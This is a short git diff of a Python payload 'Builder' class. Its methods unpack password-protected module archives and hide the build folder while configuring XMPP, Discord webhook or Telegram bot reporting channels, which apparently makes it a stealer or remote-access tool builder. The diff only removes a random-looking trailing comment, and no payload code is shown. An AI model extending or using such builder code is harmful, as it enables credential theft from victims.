@@ -167,7 +167,7 @@ class Builder():
     def BuildXMPP(self, jabberid,jabberpassword,jabberreceiver,FG):
         with pyzipper.AESZipFile('ModulesX.zip', 'r', compression=pyzipper.ZIP_STORED,
                                  encryption=pyzipper.WZ_AES) as extracted_zip:
-            extracted_zip.extractall(pwd=str.encode('pass'))#AIKLkONyKqYK73qxAHUEAcrWFkE5y2KQBiGFU14Ztw8rU8xBFu9JRL01qE6srLkE
+            extracted_zip.extractall(pwd=str.encode('pass'))
 
         win32api.SetFileAttributes('buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)
 
@@ -202,7 +202,7 @@ class Builder():
     def BuildDiscord(self,urlWebHook,name,FG):
         with pyzipper.AESZipFile('ModulesD.zip', 'r', compression=pyzipper.ZIP_STORED,
                                  encryption=pyzipper.WZ_AES) as extracted_zip:
-            extracted_zip.extractall(pwd=str.encode('pass'))#AIKLkONyKqYK73qxAHUEAcrWFkE5y2KQBiGFU14Ztw8rU8xBFu9JRL01qE6srLkE
+            extracted_zip.extractall(pwd=str.encode('pass'))
 
         win32api.SetFileAttributes('buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)
 
@@ -236,7 +236,7 @@ class Builder():
     def BuildTelegram(self,token,id,FG):
         with pyzipper.AESZipFile('ModulesT.zip', 'r', compression=pyzipper.ZIP_STORED,
                                  encryption=pyzipper.WZ_AES) as extracted_zip:
-            extracted_zip.extractall(pwd=str.encode('pass'))#AIKLkONyKqYK73qxAHUEAcrWFkE5y2KQBiGFU14Ztw8rU8xBFu9JRL01qE6srLkE
+            extracted_zip.extractall(pwd=str.encode('pass'))
 
         win32api.SetFileAttributes('buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)
 
